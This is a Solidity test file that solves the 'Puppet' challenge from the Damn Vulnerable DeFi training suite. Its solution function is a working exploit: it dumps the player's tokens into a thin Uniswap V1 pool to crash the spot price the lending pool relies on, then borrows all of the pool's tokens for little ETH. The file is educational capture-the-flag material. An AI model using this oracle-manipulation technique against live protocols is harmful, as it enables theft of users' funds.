// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "@test/BaseTest.sol";
import "@src/damn-vulnerable-defi/08-puppet/PuppetPool.sol";
import "@src/damn-vulnerable-defi/DamnValuableToken.sol";
import {sl} from "@solc-log/sl.sol";

interface UniswapV1Exchange {
    function addLiquidity(uint256 minLiquidity, uint256 maxTokens, uint256 deadline) external payable returns (uint256);
    function balanceOf(address owner) external view returns (uint256);
    function tokenToEthSwapInput(uint256 tokensSold, uint256 minEth, uint256 deadline) external returns (uint256);
    function getTokenToEthInputPrice(uint256 tokensSold) external view returns (uint256);
}

interface UniswapV1Factory {
    function initializeFactory(address template) external;
    function createExchange(address token) external returns (address);
}

/// https://www.damnvulnerabledefi.xyz/challenges/puppet/
contract PuppetTest is BaseTest {

  // Uniswap exchange will start with 10 DVT and 10 ETH in liquidity
  uint256 public constant UNISWAP_INITIAL_TOKEN_RESERVE = 10e18;
  uint256 public constant UNISWAP_INITIAL_ETH_RESERVE = 10e18;

  uint256 public constant PLAYER_INITIAL_TOKEN_BALANCE = 1000e18;
  uint256 public constant PLAYER_INITIAL_ETH_BALANCE = 25e18;

  uint256 public constant POOL_INITIAL_TOKEN_BALANCE = 100_000e18;

  UniswapV1Exchange internal _exchangeV1Template;
  UniswapV1Exchange internal _uniswapV1Exchange;
  UniswapV1Factory internal _uniswapV1Factory;

  DamnValuableToken internal _token;
  PuppetPool internal _lendingPool;

  function setUp() public override {
    /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
    vm.deal(player, PLAYER_INITIAL_ETH_BALANCE);
    _token = new DamnValuableToken();
    vm.label(address(_token), "DVT");

    // Deploy Uniswap V1 Factory
    _uniswapV1Factory = UniswapV1Factory(deployCode("./src/build-artifacts/uniswap-v1/UniswapV1Factory.json"));

    // Deploy a contract that will be used as the factory template
    _uniswapV1Exchange = UniswapV1Exchange(deployCode("./src/build-artifacts/uniswap-v1/UniswapV1Exchange.json"));

    // Deploy factory, initializing it with the address of the template exchange
    _uniswapV1Factory.initializeFactory(address(_uniswapV1Exchange));

    // Create exchange for DVT
    _uniswapV1Exchange = UniswapV1Exchange(_uniswapV1Factory.createExchange(address(_token)));

    vm.label(address(_uniswapV1Exchange), "UniswapV1Exchange");

    _lendingPool = new PuppetPool(address(_token), address(_uniswapV1Exchange));

    // Add initial token and ETH liquidity to the pool
    _token.approve(address(_uniswapV1Exchange), UNISWAP_INITIAL_TOKEN_RESERVE);
    _uniswapV1Exchange.addLiquidity{value: UNISWAP_INITIAL_ETH_RESERVE}(0, UNISWAP_INITIAL_TOKEN_RESERVE, block.timestamp + 1);

    assertEq(
      _uniswapV1Exchange.getTokenToEthInputPrice(10e18),
      _calculateTokenToEthInputPrice(10e18, UNISWAP_INITIAL_TOKEN_RESERVE, UNISWAP_INITIAL_ETH_RESERVE)
    );

    _token.transfer(player, PLAYER_INITIAL_TOKEN_BALANCE);
    _token.transfer(address(_lendingPool), POOL_INITIAL_TOKEN_BALANCE);

    // Ensure correct setup of pool. For example, to borrow 1 need to deposit 2
    assertEq(
      _lendingPool.calculateDepositRequired(10e18),
      2 * 10e18
    );
  }


  function testPuppet() public {
    /** CODE YOUR SOLUTION HERE */
    vm.startPrank(player);
    uint256 tokenBalance = _token.balanceOf(player);
    uint256 ethInput = _uniswapV1Exchange.getTokenToEthInputPrice(tokenBalance);

    _token.approve(address(_uniswapV1Exchange), tokenBalance);

    _uniswapV1Exchange.tokenToEthSwapInput(tokenBalance, ethInput, block.timestamp + 1);
    
    uint256 tokensInPool = _token.balanceOf(address(_lendingPool));
    uint256 ethToDeposit = _lendingPool.calculateDepositRequired(tokensInPool);

    _lendingPool.borrow{value: ethToDeposit}(tokensInPool, player);

    /** SUCCESS CONDITIONS - NO NEED TO CHANGE ANYTHING HERE */    
    // Player has taken all tokens from the pool       
    assertGe(_token.balanceOf(player), POOL_INITIAL_TOKEN_BALANCE, "Player must take all tokens from pool");
    assertEq(_token.balanceOf(address(_lendingPool)), 0, "Pool must not contain any tokens");
  }

  // Calculates how much ETH (in wei) Uniswap will pay for the given amount of tokens
  function _calculateTokenToEthInputPrice(
    uint256 tokensSold, 
    uint256 tokensInReserve, 
    uint256 etherInReserve
  ) internal pure returns (uint256) {
    return (tokensSold * 997 * etherInReserve) / (tokensInReserve * 1000 + tokensSold * 997);
  }
}
